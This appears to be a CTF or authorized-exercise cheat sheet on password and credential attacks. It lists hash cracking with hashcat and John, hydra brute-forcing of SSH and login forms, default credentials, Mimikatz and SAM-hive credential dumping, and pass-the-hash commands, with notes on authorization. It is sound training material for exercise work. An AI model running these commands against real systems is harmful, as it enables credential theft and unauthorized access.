# Offensive — Password & Credential Attacks (General CTF / HTB-style)

## Hash identification

```bash
hashid '<hash>'              # quick guess at hash type
hash-identifier
```

## Cracking with hashcat (GPU-accelerated, faster when available)

```bash
hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule   # with mutation rules
```

Common `-m` modes: `0` = MD5, `100` = SHA1, `1800` = sha512crypt (Linux `/etc/shadow`), `1000` = NTLM,
`3200` = bcrypt, `13100` = Kerberoast (TGS hashes).

## Cracking with John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
# Unshadow a Linux passwd+shadow pair first:
unshadow passwd.txt shadow.txt > combined.txt
john combined.txt
```

## Service brute-forcing

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<target>
hydra -L users.txt -P passwords.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

Use sparingly and deliberately in the real exercise — the guideline prohibits DoS without explicit
authorization, and aggressive brute-forcing against a shared/limited environment can look like one.

## Default/weak credential checklists

Always try before brute-forcing: `admin:admin`, `admin:password`, `root:root`, `root:toor`, blank
passwords, and the product's documented default credentials (many CTF boxes use a slightly-modified
default from the real software's documentation).

## Windows credential extraction (post-exploitation, if you already have admin on a box)

```powershell
# Mimikatz-style credential dumping — only ever against systems you're authorized to test
sekurlsa::logonpasswords
lsadump::sam
```

Via native tools, dumping the SAM/SYSTEM hives for offline cracking:
```powershell
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
# Then parse offline with a tool like secretsdump.py (Impacket) against the saved hives
```

## Pass-the-hash / lateral movement (if in scope)

```bash
crackmapexec smb <target> -u <user> -H <ntlm-hash>
evil-winrm -i <target> -u <user> -H <ntlm-hash>
```

## Note on the real exercise

Credential material found during the exercise is "exercise material" under the AI policy and the
information-handling rules — don't paste it into any AI tool once the event starts, and don't share it
outside your own team (Section 6.3.3).
